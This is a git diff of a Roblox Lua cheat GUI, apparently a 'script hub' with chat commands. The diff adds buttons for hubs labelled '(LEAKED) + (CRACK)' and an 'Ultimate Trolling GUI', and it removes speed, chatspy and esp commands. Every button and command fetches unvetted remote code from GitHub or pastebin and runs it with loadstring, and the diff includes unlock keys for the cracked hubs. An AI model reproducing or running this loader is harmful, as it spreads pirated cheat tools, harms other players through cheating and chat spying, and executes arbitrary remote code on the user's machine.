@@ -1,3 +1,7 @@
+repeat
+	wait();
+until game:IsLoaded();
+
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Background = Instance.new("ImageLabel")
@@ -8,16 +12,18 @@ local ScriptHubBtn = Instance.new("TextButton")
 local CommandsFrm = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local TextLabel_2 = Instance.new("TextLabel")
-local TextLabel_3 = Instance.new("TextLabel")
-local TextLabel_4 = Instance.new("TextLabel")
-local TextLabel_5 = Instance.new("TextLabel")
 local ToolsFrm = Instance.new("Frame")
 local HopperBin = Instance.new("TextButton")
 local ScriptHubFrm = Instance.new("Frame")
-local SyntaxV2 = Instance.new("TextButton")
-local TextLabel_6 = Instance.new("TextLabel")
-local SushiX = Instance.new("TextButton")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local HatHub = Instance.new("TextButton")
 local SelexityHub = Instance.new("TextButton")
+local SushiX = Instance.new("TextButton")
+local SyntaxV2 = Instance.new("TextButton")
+local TextLabel_3 = Instance.new("TextLabel")
+local SyntaxV13 = Instance.new("TextButton")
+local TextLabel_4 = Instance.new("TextLabel")
+local UTG = Instance.new("TextButton")
 local TopBar = Instance.new("Frame")
 local ImageLabel = Instance.new("ImageLabel")
 local ImageLabel_2 = Instance.new("ImageLabel")
@@ -40,7 +46,6 @@ Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0.228059888, 0, 0.279489607, 0)
 Frame.Size = UDim2.new(0, 580, 0, 323)
-Frame.Visible = false
 
 Background.Name = "Background"
 Background.Parent = Frame
@@ -116,36 +121,6 @@ TextLabel_2.Text = ";infjump "
 TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.TextSize = 14.000
 
-TextLabel_3.Parent = CommandsFrm
-TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.BackgroundTransparency = 1.000
-TextLabel_3.Position = UDim2.new(0.309368193, 0, 0.065863356, 0)
-TextLabel_3.Size = UDim2.new(0, 77, 0, 25)
-TextLabel_3.Font = Enum.Font.FredokaOne
-TextLabel_3.Text = ";speed(C)"
-TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.TextSize = 14.000
-
-TextLabel_4.Parent = CommandsFrm
-TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.BackgroundTransparency = 1.000
-TextLabel_4.Position = UDim2.new(0.477124184, 0, 0.065863356, 0)
-TextLabel_4.Size = UDim2.new(0, 77, 0, 25)
-TextLabel_4.Font = Enum.Font.FredokaOne
-TextLabel_4.Text = ";chatspy"
-TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.TextSize = 14.000
-
-TextLabel_5.Parent = CommandsFrm
-TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.BackgroundTransparency = 1.000
-TextLabel_5.Position = UDim2.new(0.644880176, 0, 0.065863356, 0)
-TextLabel_5.Size = UDim2.new(0, 77, 0, 25)
-TextLabel_5.Font = Enum.Font.FredokaOne
-TextLabel_5.Text = ";esp"
-TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.TextSize = 14.000
-
 ToolsFrm.Name = "ToolsFrm"
 ToolsFrm.Parent = Background
 ToolsFrm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -169,6 +144,7 @@ HopperBin.MouseButton1Down:connect(function()
 	Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4
 end)
 
+
 ScriptHubFrm.Name = "ScriptHubFrm"
 ScriptHubFrm.Parent = Background
 ScriptHubFrm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -177,40 +153,55 @@ ScriptHubFrm.Position = UDim2.new(0.187931031, 0, 0.176470593, 0)
 ScriptHubFrm.Size = UDim2.new(0, 459, 0, 259)
 ScriptHubFrm.Visible = false
 
-SyntaxV2.Name = "SyntaxV2"
-SyntaxV2.Parent = ScriptHubFrm
-SyntaxV2.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
-SyntaxV2.BorderColor3 = Color3.fromRGB(181, 0, 0)
-SyntaxV2.BorderSizePixel = 2
-SyntaxV2.Position = UDim2.new(0.0424762145, 0, 0.0654825941, 0)
-SyntaxV2.Size = UDim2.new(0, 415, 0, 26)
-SyntaxV2.Font = Enum.Font.FredokaOne
-SyntaxV2.Text = "SyntaxV2"
-SyntaxV2.TextColor3 = Color3.fromRGB(255, 255, 255)
-SyntaxV2.TextSize = 14.000
-SyntaxV2.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn'),true))()
+ScrollingFrame.Parent = ScriptHubFrm
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Position = UDim2.new(0.0336148143, 0, 0.0658632964, 0)
+ScrollingFrame.Size = UDim2.new(0, 436, 0, 238)
+
+HatHub.Name = "HatHub"
+HatHub.Parent = ScrollingFrame
+HatHub.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+HatHub.BorderColor3 = Color3.fromRGB(181, 0, 0)
+HatHub.BorderSizePixel = 2
+HatHub.Position = UDim2.new(0.0103661213, 0, 0.33382234, 0)
+HatHub.Size = UDim2.new(0, 415, 0, 26)
+HatHub.Font = Enum.Font.FredokaOne
+HatHub.Text = "HatHub (LEAKED) + (CRACK)"
+HatHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+HatHub.TextSize = 14.000
+HatHub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/MariTarziu2009/HatHub/main/HatHub"),true))()
 end)
 
-TextLabel_6.Parent = SyntaxV2
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.BackgroundTransparency = 1.000
-TextLabel_6.Position = UDim2.new(0, 0, 1, 0)
-TextLabel_6.Size = UDim2.new(0, 415, 0, 19)
-TextLabel_6.Font = Enum.Font.FredokaOne
-TextLabel_6.Text = "Key: Syntaxbesthub"
-TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.TextSize = 14.000
+
+
+SelexityHub.Name = "Selexity Hub"
+SelexityHub.Parent = ScrollingFrame
+SelexityHub.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+SelexityHub.BorderColor3 = Color3.fromRGB(181, 0, 0)
+SelexityHub.BorderSizePixel = 2
+SelexityHub.Position = UDim2.new(0.0103661213, 0, 0.266254753, 0)
+SelexityHub.Size = UDim2.new(0, 415, 0, 26)
+SelexityHub.Font = Enum.Font.FredokaOne
+SelexityHub.Text = "Selexity Hub (LEAKED) + (CRACK)"
+SelexityHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+SelexityHub.TextSize = 14.000
+SelexityHub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'),true))()
+end)
 
 SushiX.Name = "Sushi X"
-SushiX.Parent = ScriptHubFrm
+SushiX.Parent = ScrollingFrame
 SushiX.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
 SushiX.BorderColor3 = Color3.fromRGB(181, 0, 0)
 SushiX.BorderSizePixel = 2
-SushiX.Position = UDim2.new(0.0424762145, 0, 0.266254783, 0)
+SushiX.Position = UDim2.new(0.0103661232, 0, 0.198687226, 0)
 SushiX.Size = UDim2.new(0, 415, 0, 26)
 SushiX.Font = Enum.Font.FredokaOne
-SushiX.Text = "Sushi X"
+SushiX.Text = "Sushi X (LEAKED) + (CRACK)"
 SushiX.TextColor3 = Color3.fromRGB(255, 255, 255)
 SushiX.TextSize = 14.000
 SushiX.MouseButton1Down:connect(function()
@@ -240,26 +231,76 @@ loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
 end)
 
 
-SelexityHub.Name = "Selexity Hub"
-SelexityHub.Parent = ScriptHubFrm
-SelexityHub.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
-SelexityHub.BorderColor3 = Color3.fromRGB(181, 0, 0)
-SelexityHub.BorderSizePixel = 2
-SelexityHub.Position = UDim2.new(0.0424762145, 0, 0.405250907, 0)
-SelexityHub.Size = UDim2.new(0, 415, 0, 26)
-SelexityHub.Font = Enum.Font.FredokaOne
-SelexityHub.Text = "Selexity Hub"
-SelexityHub.TextColor3 = Color3.fromRGB(255, 255, 255)
-SelexityHub.TextSize = 14.000
-SelexityHub.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'),true))()
+SyntaxV2.Name = "SyntaxV2"
+SyntaxV2.Parent = ScrollingFrame
+SyntaxV2.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+SyntaxV2.BorderColor3 = Color3.fromRGB(181, 0, 0)
+SyntaxV2.BorderSizePixel = 2
+SyntaxV2.Position = UDim2.new(0.0103661232, 0, -0.000154472888, 0)
+SyntaxV2.Size = UDim2.new(0, 415, 0, 26)
+SyntaxV2.Font = Enum.Font.FredokaOne
+SyntaxV2.Text = "SyntaxV2 (LEAKED) + (CRACK)"
+SyntaxV2.TextColor3 = Color3.fromRGB(255, 255, 255)
+SyntaxV2.TextSize = 14.000
+SyntaxV2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn'),true))()
 end)
 
+TextLabel_3.Parent = SyntaxV2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_3.Size = UDim2.new(0, 415, 0, 19)
+TextLabel_3.Font = Enum.Font.FredokaOne
+TextLabel_3.Text = "Key: Syntaxbesthub"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 14.000
+
+SyntaxV13.Name = "SyntaxV1.3"
+SyntaxV13.Parent = ScrollingFrame
+SyntaxV13.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+SyntaxV13.BorderColor3 = Color3.fromRGB(181, 0, 0)
+SyntaxV13.BorderSizePixel = 2
+SyntaxV13.Position = UDim2.new(0.0103661232, 0, 0.0963706523, 0)
+SyntaxV13.Size = UDim2.new(0, 415, 0, 26)
+SyntaxV13.Font = Enum.Font.FredokaOne
+SyntaxV13.Text = "SyntaxV1.3 (LEAKED) + (CRACK)"
+SyntaxV13.TextColor3 = Color3.fromRGB(255, 255, 255)
+SyntaxV13.TextSize = 14.000
+SyntaxV13.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/MariTarziu2009/SyntaxV1.3/main/SyntaxV1.3"),true))()
+end)
+
+
+TextLabel_4.Parent = SyntaxV13
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_4.Size = UDim2.new(0, 415, 0, 19)
+TextLabel_4.Font = Enum.Font.FredokaOne
+TextLabel_4.Text = "Key: Syntaxontop"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 14.000
+
+UTG.Name = "UTG"
+UTG.Parent = ScrollingFrame
+UTG.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
+UTG.BorderColor3 = Color3.fromRGB(181, 0, 0)
+UTG.BorderSizePixel = 2
+UTG.Position = UDim2.new(0.0103661213, 0, 0.399459422, 0)
+UTG.Size = UDim2.new(0, 415, 0, 26)
+UTG.Font = Enum.Font.FredokaOne
+UTG.Text = " UTG Ultimate Trolling GUI V3"
+UTG.TextColor3 = Color3.fromRGB(255, 255, 255)
+UTG.TextSize = 14.000
+UTG.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))()
+end)
 
 TopBar.Name = "TopBar"
 TopBar.Parent = Frame
 TopBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TopBar.BackgroundTransparency = 0.400
+TopBar.BackgroundTransparency = 1.000
 TopBar.BorderSizePixel = 0
 TopBar.Position = UDim2.new(0, 0, 0.145692289, 0)
 TopBar.Size = UDim2.new(0, 580, 0, 3)
@@ -296,7 +337,7 @@ UICorner_3.Parent = Frame
 
 ImageLabel_3.Parent = ScreenGui
 ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageLabel_3.Position = UDim2.new(0, 0, 0.535104394, 0)
+ImageLabel_3.Position = UDim2.new(0, 0, 0.498126894, 0)
 ImageLabel_3.Size = UDim2.new(0, 155, 0, 50)
 ImageLabel_3.Image = "rbxassetid://3027262817"
 
@@ -329,7 +370,7 @@ OpenBtn.TextSize = 14.000
 
 -- Scripts:
 
-local function RHASDL_fake_script() -- CommandsBtn.LocalScript 
+local function NDCH_fake_script() -- CommandsBtn.LocalScript 
 	local script = Instance.new('LocalScript', CommandsBtn)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -338,8 +379,8 @@ local function RHASDL_fake_script() -- CommandsBtn.LocalScript
 		script.Parent.Parent.ScriptHubFrm.Visible = false
 	end)
 end
-coroutine.wrap(RHASDL_fake_script)()
-local function GTVFGT_fake_script() -- ToolsBtn.LocalScript 
+coroutine.wrap(NDCH_fake_script)()
+local function TUEBQ_fake_script() -- ToolsBtn.LocalScript 
 	local script = Instance.new('LocalScript', ToolsBtn)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -348,8 +389,8 @@ local function GTVFGT_fake_script() -- ToolsBtn.LocalScript
 		script.Parent.Parent.ScriptHubFrm.Visible = false
 	end)
 end
-coroutine.wrap(GTVFGT_fake_script)()
-local function JITJNKU_fake_script() -- ScriptHubBtn.LocalScript 
+coroutine.wrap(TUEBQ_fake_script)()
+local function OWMYV_fake_script() -- ScriptHubBtn.LocalScript 
 	local script = Instance.new('LocalScript', ScriptHubBtn)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -358,16 +399,16 @@ local function JITJNKU_fake_script() -- ScriptHubBtn.LocalScript
 		script.Parent.Parent.ScriptHubFrm.Visible = true
 	end)
 end
-coroutine.wrap(JITJNKU_fake_script)()
-local function NQPM_fake_script() -- CloseBtn.LocalScript 
+coroutine.wrap(OWMYV_fake_script)()
+local function JDYVJKC_fake_script() -- CloseBtn.LocalScript 
 	local script = Instance.new('LocalScript', CloseBtn)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		game.Players.LocalPlayer.PlayerGui.ScreenGui.Frame.Visible = false
 	end)
 end
-coroutine.wrap(NQPM_fake_script)()
-local function NCIHQG_fake_script() -- Frame.LocalScript 
+coroutine.wrap(JDYVJKC_fake_script)()
+local function LIUGU_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	local UIS = game:GetService('UserInputService')
@@ -405,15 +446,15 @@ local function NCIHQG_fake_script() -- Frame.LocalScript
 		end
 	end)
 end
-coroutine.wrap(NCIHQG_fake_script)()
-local function RMNVFQ_fake_script() -- OpenBtn.LocalScript 
+coroutine.wrap(LIUGU_fake_script)()
+local function YOWTN_fake_script() -- OpenBtn.LocalScript 
 	local script = Instance.new('LocalScript', OpenBtn)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		game.Players.LocalPlayer.PlayerGui.ScreenGui.Frame.Visible = true
 	end)
 end
-coroutine.wrap(RMNVFQ_fake_script)()
+coroutine.wrap(YOWTN_fake_script)()
 
 -- FE Admin
 
@@ -454,15 +495,7 @@ LPlayer.Chatted:Connect(function(msg)
         if cmd == "infjump" then
 			loadstring(game:HttpGet("https://pastebin.com/raw/guJ5wajR"))()
 		end
-         if cmd == "speed(C)" then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/angeloX041/Speedc/main/SuperSpeedC "))()
-		end
-        if cmd == "chatSpy" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/MwmrpsPK"))()
-		end
-        if cmd == "esp" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/5Uj8i3Ja"))()
-		end
+     
         
 	    
 		
